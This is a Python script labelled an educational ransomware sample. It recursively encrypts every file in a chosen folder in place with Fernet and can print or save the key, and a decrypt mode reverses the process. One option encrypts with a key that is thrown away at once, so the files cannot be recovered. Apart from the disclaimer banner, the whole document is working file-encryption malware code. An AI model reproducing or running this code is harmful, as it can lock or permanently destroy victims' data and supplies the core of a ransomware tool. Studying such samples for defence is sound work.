import os
import shutil
from cryptography.fernet import Fernet

def backup_file(file_path, backup_folder, target_folder):
    relative_path = os.path.relpath(file_path, start=target_folder)
    backup_path = os.path.join(backup_folder, relative_path)
    if not os.path.exists(backup_path):
        os.makedirs(os.path.dirname(backup_path), exist_ok=True)
        shutil.copy2(file_path, backup_path)
    else:
        print(f"Backup folder already exists: {backup_path}")

def store_key_in_backup(key, backup_folder):
    key_file_path = os.path.join(backup_folder, 'encryption_key.txt')
    with open(key_file_path, 'w') as key_file:
        key_file.write(key.decode())

def encrypt_file(file_path, cipher, backup_enabled, backup_folder, target_folder):
    if backup_enabled:
        backup_file(file_path, backup_folder, target_folder)
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = cipher.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def decrypt_file(file_path, cipher):
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = cipher.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)
        
def main():
    print("*****Ransomware Educational Sample*****")
    print(" ")
    print("This program is for educational purposes only.")
    print("Use it responsibly and only on your own systems.")
    print("I am not responsible for any misuse or damage caused by this tool.")
    print(" ")
    print(" ")
    print(" ")
    while True:
        action = input("Do you want to (e)ncrypt or (d)ecrypt? (Press 'q' to quit): ").lower()

        if action == 'q':
            print("Exiting the program.")
            exit()

        if action == 'e' or action == 'encrypt':
            target_folder = input("Enter the path to the folder you want to encrypt: ")
            backup_option = input("Do you want to enable backup? (yes/no): ").lower() == 'yes'
            if backup_option:
                backup_folder = input("Enter the path to the backup folder: ")
            else:
                backup_folder = None
            key_option = input("Do you want to receive an encryption key for decryption? (yes/no): ").lower() == 'yes'
            if key_option:
                key = Fernet.generate_key()
                cipher = Fernet(key)
                for root, dirs, files in os.walk(target_folder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        encrypt_file(file_path, cipher, backup_option, backup_folder, target_folder)
                print(f"Encryption key: {key.decode()}")
                print("Encryption completed. Files have been encrypted.")
                if backup_option:
                    store_key_in_backup(key, backup_folder)
            else:
                confirmation = input("Warning: You will not be able to decrypt the encrypted files anymore. The data will be lost. Do you want to continue? (yes/no): ").lower()
                if confirmation == 'yes':
                    cipher = Fernet.generate_key()
                    cipher = Fernet(cipher)
                    for root, dirs, files in os.walk(target_folder):
                        for file in files:
                            file_path = os.path.join(root, file)
                            encrypt_file(file_path, cipher, backup_option, backup_folder, target_folder)
                    print("Encryption completed. Files have been encrypted.")
                else:
                    print("Encryption aborted.")
        elif action == 'd' or action == 'decrypt':
            target_folder = input("Enter the path to the folder you want to decrypt: ")
            key = input("Enter the encryption key: ").encode()
            try:
                cipher = Fernet(key)
            except ValueError:
                print("Invalid encryption key provided. Unable to decrypt.")
                continue
            for root, dirs, files in os.walk(target_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    decrypt_file(file_path, cipher)
            print("Decryption completed.")
        else:
            print("Invalid action. Please enter 'e' for encryption or 'd' for decryption.")

if __name__ == "__main__":
    main()
